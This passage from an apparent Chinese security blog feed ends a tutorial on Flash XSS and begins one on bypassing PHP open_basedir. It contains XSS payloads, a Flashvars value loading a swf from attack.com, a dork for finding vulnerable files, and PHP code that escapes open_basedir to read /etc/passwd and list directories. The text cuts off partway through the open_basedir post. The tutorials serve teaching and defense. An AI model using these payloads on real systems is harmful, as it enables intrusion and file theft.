src="/2019/07/21/Flash型XSS小结/4.png" alt=""></p><p>我们在IE的开发者工具中调试分析看看，先输入<code>?movieName=mi1k7ea&quot;</code>，即测试双引号是否被转义：</p><p><img src="/2019/07/21/Flash型XSS小结/7.png" alt=""></p><p>可以看到是对双引号进行了转义。</p><p>因此，当我们输入反斜杠和双引号后，由于反引号会被转义掉，从而使其后面的双引号可以逃逸出来让console.log()的双引号得以闭合，然后再构造后面恶意的JS代码即可。在IE调试下的结构如图：</p><p><img src="/2019/07/21/Flash型XSS小结/8.png" alt=""></p><h3 id="getURL"><a href="#getURL" class="headerlink" title="getURL"></a>getURL</h3><p>在Flash中ActionScript 2可以使用getURL来执行JavaScript。</p><p>getURLTest.fla：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var Fei_xml:XML = new XML(); //创建xml对象</span><br><span class="line">Fei_xml.ignoreWhite = true;  //</span><br><span class="line">Fei_xml.onLoad = function()&#123; getURL(Fei_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue);&#125; //获取值</span><br><span class="line">Fei_xml.load(_root.mi1k7ea);  //加载XML文档</span><br></pre></td></tr></table></figure><p>使用FlashCS6编译成swf。</p><p>在Web目录中编辑a.xml文件，用于触发XSS：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span>&gt;</span>javascript:alert('Flash XSS')<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：childNodes[0]的个数和目标XML文件中JS代码所在的内嵌标签数量有关，必须设置正确才能成功触发。</p><p>URL参数栏输入目标XML文件即可触发XSS：</p><p><img src="/2019/07/21/Flash型XSS小结/16.png" alt=""></p><p>造成Flash XSS的主要原因就是没对<code>?mi1k7ea=a.xml</code>获取的内容进行过滤导致的。</p><p>这里提供一个查找此类漏洞文件的Google Hack关键字：filetype:swf   inurl:xml</p><h3 id="navigateToURL"><a href="#navigateToURL" class="headerlink" title="navigateToURL"></a>navigateToURL</h3><p>在ActionScript 3中已经不在支持getURL了，但可以用navigateToURL来执行JavaScript。</p><p>navigateToURLTest.as，这里用Flex编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">import flash.display.Sprite;</span><br><span class="line">import flash.events.Event;</span><br><span class="line">import flash.net.URLLoader;</span><br><span class="line">import flash.net.URLRequest;</span><br><span class="line">import flash.net.navigateToURL;</span><br><span class="line"></span><br><span class="line">public class navigateToURLTest extends Sprite</span><br><span class="line">&#123;</span><br><span class="line">public function navigateToURLTest()</span><br><span class="line">&#123;</span><br><span class="line">var url:String = stage.loaderInfo.parameters.url   //获取url参数值</span><br><span class="line">var req:URLRequest = new URLRequest(&quot;flash.xml&quot;);</span><br><span class="line">var ld:URLLoader = new URLLoader();</span><br><span class="line">ld.addEventListener(Event.COMPLETE ,ok);</span><br><span class="line">function ok(evtObj:Event):void &#123;</span><br><span class="line">if(ld.data)&#123;</span><br><span class="line">//navigateToURL(new URLRequest(&quot;javascript:alert(&quot;+url+&quot;)&quot;),&apos;_self&apos;)</span><br><span class="line">navigateToURL(new URLRequest(url),&apos;_self&apos;) //通过navigateToURL调用执行</span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ld.load(req)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入payload<code>?url=javascript:alert(&#39;navigateToURL hacked&#39;)</code>：</p><p><img src="/2019/07/21/Flash型XSS小结/5.png" alt=""></p><h3 id="htmlText"><a href="#htmlText" class="headerlink" title="htmlText"></a>htmlText</h3><p>在Flash里支持HTMLText属性，HTMLText的作用是显示html标签等。</p><p>htmlTextTest.as：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">import flash.display.Sprite;</span><br><span class="line">import flash.text.TextField;</span><br><span class="line"></span><br><span class="line">public class htmlTextTest extends Sprite</span><br><span class="line">&#123;</span><br><span class="line">public function htmlTextTest()</span><br><span class="line">&#123;</span><br><span class="line">var a:String = root.loaderInfo.parameters.Mi1k7ea //获取提交参数的值</span><br><span class="line">var info:TextField = new TextField();  //创建控件对象</span><br><span class="line">info.multiline=true;</span><br><span class="line">info.wordWrap=true;</span><br><span class="line">info.htmlText = a; //显示</span><br><span class="line">addChild(info);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Flash支持htmlText属性，其作用是显示html标签等。这里我们可以使用img或a标签触发xss代码。</p><h4 id="a标签触发Flash-XSS"><a href="#a标签触发Flash-XSS" class="headerlink" title="a标签触发Flash XSS"></a>a标签触发Flash XSS</h4><p>先看用a标签的情况，在href中输入js伪协议实现执行js代码，从而触发Flash XSS。</p><p>输入payload<code>?Mi1k7ea=&lt;a href=&#39;javascript:alert(&quot;htmlText hacked&quot;)&#39;&gt;Click Me!&lt;/a&gt;</code>：</p><p><img src="/2019/07/21/Flash型XSS小结/9.png" alt=""></p><h4 id="img标签触发XSF"><a href="#img标签触发XSF" class="headerlink" title="img标签触发XSF"></a>img标签触发XSF</h4><p>这里我们使用img标签来加载一个远程含有JS跨站代码的swf文件从而实现XSF攻击。</p><p>远程含有XSS代码的swf文件，这里简单写个例子Mi1k7ea.as：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class Mi1k7ea extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function Mi1k7ea()</span><br><span class="line">        &#123;</span><br><span class="line">            ExternalInterface.call(&apos;alert(&quot;XSF Hacked&quot;)&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译好swf文件后放置在远程服务器中。</p><p>输入payload<code>?Mi1k7ea=&lt;img src=&#39;http://127.0.0.1/Mi1k7ea.swf&#39;&gt;</code>：</p><p><img src="/2019/07/21/Flash型XSS小结/10.png" alt=""></p><h3 id="未初始化变量导致的XSS"><a href="#未初始化变量导致的XSS" class="headerlink" title="未初始化变量导致的XSS"></a>未初始化变量导致的XSS</h3><p>在PHP中Globals全局变量在开启的时候，允许在POST个GET参数中改变php脚本中变量的值，也就是经典的全局变量导致的变量覆盖漏洞。在ActionScript 2中也有类似的特性，任何未被初始化的变量都可以以POST或GET方式来改变变量的值，因此会导致一些安全问题。</p><p>var.fla，这里未初始化user变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(user)</span><br><span class="line">&#123;</span><br><span class="line">getURL(_root.mi1k7ea);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入payload<code>?user=1&amp;mi1k7ea=javascript:alert(&#39;var hacked&#39;)</code>：</p><p><img src="/2019/07/21/Flash型XSS小结/17.png" alt=""></p><h3 id="XSF"><a href="#XSF" class="headerlink" title="XSF"></a>XSF</h3><p>跨站Flash攻击，就是使用ActionScript加载第三方的Flash文件时，攻击者能控制这个第三方的Flash文件，这样就有可能造成XSF攻击，以下函数如果使用不当就很容易产生XSF问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">loadVariables()</span><br><span class="line">loadMovie()</span><br><span class="line">loadMovieNum()</span><br><span class="line">FScrollPane.loadScrollContent()</span><br><span class="line">LoadVars.send()</span><br><span class="line">XML.load(&apos;URL&apos;)</span><br><span class="line">LoadVars.load(&apos;url&apos;)</span><br><span class="line">Sound.loadSound(&apos;url&apos;)</span><br><span class="line">NetStream.play(&apos;url&apos;)</span><br></pre></td></tr></table></figure><p>通过这些恶意接口，可以指定URL为我们构造的恶意文件如swf或xml文件，从而在目标网站实现JS攻击。</p><p>直接看个例子，XSFTest.as：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">import flash.display.Sprite;</span><br><span class="line">import flash.display.Loader;</span><br><span class="line">import flash.net.URLRequest;</span><br><span class="line"></span><br><span class="line">public class XSFTest extends Sprite</span><br><span class="line">&#123;</span><br><span class="line">public function XSFTest()</span><br><span class="line">&#123;</span><br><span class="line">var param:Object = root.loaderInfo.parameters;</span><br><span class="line">var swf:String = param[&quot;swf&quot;];</span><br><span class="line">var myLoader:Loader = new Loader();</span><br><span class="line">var url:URLRequest = new URLRequest(swf);</span><br><span class="line">myLoader.load(url);</span><br><span class="line">addChild(myLoader);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XSF.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">id</span>=<span class="string">"lso"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-Flash"</span> <span class="attr">data</span>=<span class="string">"http://127.0.0.1/XSFTest.swf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"http://127.0.0.1/XSFTest.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"Flashvars"</span> <span class="attr">value</span>=<span class="string">"swf=http://attack.com/Mi1k7ea.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>至于Mi1k7ea.swf文件，是前面第一节示例用于XSS弹框的Demo，这里作为攻击者的恶意swf文件。</p><p>先看下直接访问XSFTest.swf文件再传入远程服务器上的swf文件看看能不能执行成功：</p><p><img src="/2019/07/21/Flash型XSS小结/19.png" alt=""></p><p>可以看到，请求了远程服务器上的swf文件但并没有成功执行该swf文件。原因在于远程服务器上的swf文件并没有对Flash的跨域请求进行相应的授权。</p><p>如果访问目标服务器的XSF.html页面，可以看到XSF.html中嵌入的XSFTest.swf文件通过参数传入成功调用了远程服务器上的swf文件，关键在于allowScriptAccess和allowNetworking的设置进行了授权：</p><p><img src="/2019/07/21/Flash型XSS小结/18.png" alt=""></p><h2 id="0x03-漏洞挖掘"><a href="#0x03-漏洞挖掘" class="headerlink" title="0x03 漏洞挖掘"></a>0x03 漏洞挖掘</h2><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>由于Flash XSS是前端问题，swf文件可下载到本地且是可反编译的，因此就可直接进行白盒测试。</p><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>简单分为以下几步：</p><p>1、将目标swf文件下载到本地，反编译得到源码；</p><p>2、搜索危险函数，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ExternalInterface.call()</span><br><span class="line">getURL()</span><br><span class="line">navigateToURL()</span><br><span class="line">htmlText</span><br><span class="line">loadVariables()</span><br><span class="line">loadMovie()</span><br><span class="line">loadMovieNum()</span><br><span class="line">FScrollPane.loadScrollContent()</span><br><span class="line">LoadVars.send()</span><br><span class="line">LoadVars.load()</span><br><span class="line">XML.load()</span><br><span class="line">Sound.loadSound()</span><br><span class="line">NetStream.play()</span><br></pre></td></tr></table></figure><p>3、若存在危险函数，则进一步查找是否有接受外部输入参数的关键字，即寻找AS2和AS3下的传参关键字，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_root.argv</span><br><span class="line">loaderInfo.parameters</span><br></pre></td></tr></table></figure><p>4、若都存在，则需要进行最后的人工代码审计。</p><h2 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h2><ul><li>如果无嵌入Flash的需求，尽量禁用embed和object标签；</li><li>对Flash文件的输入输出编码过滤；</li><li>在HTML中嵌入Flash时，严格设置allowScriptAccess参数和allowNetworking参数的值，遵循权限最小化原则；</li><li>可参考一些网上写好的过滤函数，如：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public static function checkJsFunctionValid(functionName:String):Boolean</span><br><span class="line">&#123;</span><br><span class="line">var reg:RegExp = /^[a-zA-Z0-9_\.]+$/;</span><br><span class="line">return reg.test(functionName);</span><br><span class="line">&#125;          </span><br><span class="line"></span><br><span class="line">public static function checkObjectIdValid():Boolean</span><br><span class="line">&#123;</span><br><span class="line">    if (ExternalInterface.available)</span><br><span class="line">    &#123;</span><br><span class="line">        var objectId:String = ExternalInterface.objectID;</span><br><span class="line">        if (!objectId || (objectId == objectId.replace(/[^0-9a-zA-Z_]/g , &quot;&quot;)))</span><br><span class="line">        return true;</span><br><span class="line">        else</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://joychou.org/web/flash-xss.html#directory061280281423452145" target="_blank" rel="noopener">Flash XSS Security</a></p><p><a href="https://aq.163.com/module/pedia/article-00035.html" target="_blank" rel="noopener">浅谈flash引发的跨站问题</a></p><p><a href="https://www.secpulse.com/archives/44299.html" target="_blank" rel="noopener">Flash XSS攻击总结</a></p><p><a href="https://cloud.tencent.com/developer/article/1089548" target="_blank" rel="noopener">常见Flash XSS攻击方式</a></p><p><a href="https://www.cnblogs.com/kenkofox/p/3405395.html" target="_blank" rel="noopener">Flash XSS 漏洞详解 根治的好办法</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Flash" scheme="https://Mi1k7ea.github.com/tags/Flash/"/>
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>浅谈几种Bypass open_basedir的方法</title>
    <link href="https://Mi1k7ea.github.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://Mi1k7ea.github.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/</id>
    <published>2019-07-20T03:24:35.000Z</published>
    <updated>2019-07-20T11:56:38.605Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-open-basedir"><a href="#0x01-open-basedir" class="headerlink" title="0x01 open_basedir"></a>0x01 open_basedir</h2><p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。</p><p>假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。</p><p>注意：用open_basedir指定的<strong>限制实际上是前缀，而不是目录名</strong>。</p><p>为了演示下面的几个示例，我这里环境的open_basedir设置为Web目录和tmp目录：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/1.png" alt=""></p><p>测试一下，我在/home目录中新建一个1.txt文件，尝试对其进行读取，发现读取失败：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/2.png" alt=""></p><p>换了Web目录及其子目录和tmp目录中的文件就能成功读取，这就是open_basedir所起到的作用。</p><h2 id="0x02-利用命令执行函数Bypass"><a href="#0x02-利用命令执行函数Bypass" class="headerlink" title="0x02 利用命令执行函数Bypass"></a>0x02 利用命令执行函数Bypass</h2><p>但是open_basedir对命令执行函数没有限制，我们可以使用system()函数试一下，在前面的代码前加上system()代码来进行对比：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//echo file_get_contents('/home/1.txt');</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">system(<span class="string">'cat /home/1.txt'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>确实能够成功读到目标文件，不受open_basedir的限制：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/3.png" alt=""></p><p>至于其他的命令执行函数可自行尝试。</p><p>但是一般情况下，system()等命令执行函数可能会被disable_functions给禁用掉，因此运用到的场景可能并不多。</p><h2 id="0x03-利用symlink-函数Bypass"><a href="#0x03-利用symlink-函数Bypass" class="headerlink" title="0x03 利用symlink()函数Bypass"></a>0x03 利用symlink()函数Bypass</h2><h3 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h3><blockquote><p>符号链接又叫软链接，是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身。</p></blockquote><h3 id="symlink-函数"><a href="#symlink-函数" class="headerlink" title="symlink()函数"></a>symlink()函数</h3><p>(PHP 4, PHP 5, PHP 7)</p><p>symlink()函数创建一个从指定名称连接的现存目标文件开始的符号连接。如果成功，该函数返回TRUE；如果失败，则返回FALSE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">symlink ( string $target , string $link ) : bool</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">target</td><td style="text-align:left">必需。连接的目标。</td></tr><tr><td style="text-align:left">link</td><td style="text-align:left">必需。连接的名称。</td></tr></tbody></table><p>当然一般情况下这个target是受限于open_basedir的。</p><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>先给出payload，原理在后面说明，这里需要跨几层目录就需要创建几层目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mkdir(<span class="string">"A"</span>);</span><br><span class="line">chdir(<span class="string">"A"</span>);</span><br><span class="line">mkdir(<span class="string">"B"</span>);</span><br><span class="line">chdir(<span class="string">"B"</span>);</span><br><span class="line">mkdir(<span class="string">"C"</span>);</span><br><span class="line">chdir(<span class="string">"C"</span>);</span><br><span class="line">mkdir(<span class="string">"D"</span>);</span><br><span class="line">chdir(<span class="string">"D"</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">symlink(<span class="string">"A/B/C/D"</span>,<span class="string">"7ea"</span>);</span><br><span class="line">symlink(<span class="string">"7ea/../../../../etc/passwd"</span>,<span class="string">"exp"</span>);</span><br><span class="line">unlink(<span class="string">"7ea"</span>);</span><br><span class="line">mkdir(<span class="string">"7ea"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问该PHP文件后，后台便生成了两个目录和一个名为exp的符号链接：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/4.png" alt=""></p><p>在Web中我们直接访问exp即可读取到目标文件：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/5.png" alt=""></p><p>原理就是：创建一个链接文件7ea，用相对路径指向A/B/C/D，再创建一个链接文件exp指向7ea/../../../../etc/passwd。其实指向的就是A/B/C/D/../../../../etc/passwd，其实就是/etc/passwd。这时候删除7ea，再创建一个7ea目录，但exp还是指向7ea/../../../etc/passwd，所以就成功跨到/etc/passwd了。 </p><p>重点在这四句： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">symlink(<span class="string">"A/B/C/D"</span>,<span class="string">"7ea"</span>);</span><br><span class="line">symlink(<span class="string">"7ea/../../../../etc/passwd"</span>,<span class="string">"exp"</span>);</span><br><span class="line">unlink(<span class="string">"7ea"</span>);</span><br><span class="line">mkdir(<span class="string">"7ea"</span>);</span><br></pre></td></tr></table></figure><p>payload构造的注意点就是：要读的文件需要往前跨多少路径，就得创建多少层的子目录，然后输入多少个../来设置目标文件。</p><h2 id="0x04-利用glob-伪协议Bypass"><a href="#0x04-利用glob-伪协议Bypass" class="headerlink" title="0x04 利用glob://伪协议Bypass"></a>0x04 利用glob://伪协议Bypass</h2><h3 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h3><p>glob:// — 查找匹配的文件路径模式。</p><p>glob://是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，其用法示例如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span></span><br><span class="line"><span class="comment">// 并打印文件名和文件尺寸</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://ext/spl/examples/*.php"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    printf(<span class="string">"%s: %.1FK\n"</span>, $f-&gt;getFilename(), $f-&gt;getSize()/<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h3><p>只是用glob://伪协议是无法直接绕过的，它需要结合其他函数组合利用，主要有以下两种利用方式，局限性在于它们都只能列出根目录下和open_basedir指定的目录下的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p><h3 id="方式1——DirectoryIterator-glob"><a href="#方式1——DirectoryIterator-glob" class="headerlink" title="方式1——DirectoryIterator+glob://"></a>方式1——DirectoryIterator+glob://</h3><p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。</p><p>DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$a = <span class="keyword">new</span> DirectoryIterator($c);</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span>($f-&gt;__toString().<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入<code>glob:///*</code>即可列出根目录下的文件，但是会发现只能列根目录和open_basedir指定的目录的文件：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/6.png" alt=""></p><h3 id="方式2——opendir-readdir-glob"><a href="#方式2——opendir-readdir-glob" class="headerlink" title="方式2——opendir()+readdir()+glob://"></a>方式2——opendir()+readdir()+glob://</h3><p>opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目。</p><p>这里结合两个函数来列举根目录中的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">if</span> ( $b = opendir($a) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( ($file = readdir($b)) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $file.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>效果和方式1是一样的，只能Bypass open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件。</p><h2 id="0x05-利用chdir-与ini-set-组合Bypass"><a href="#0x05-利用chdir-与ini-set-组合Bypass" class="headerlink" title="0x05 利用chdir()与ini_set()组合Bypass"></a>0x05 利用chdir()与ini_set()组合Bypass</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" 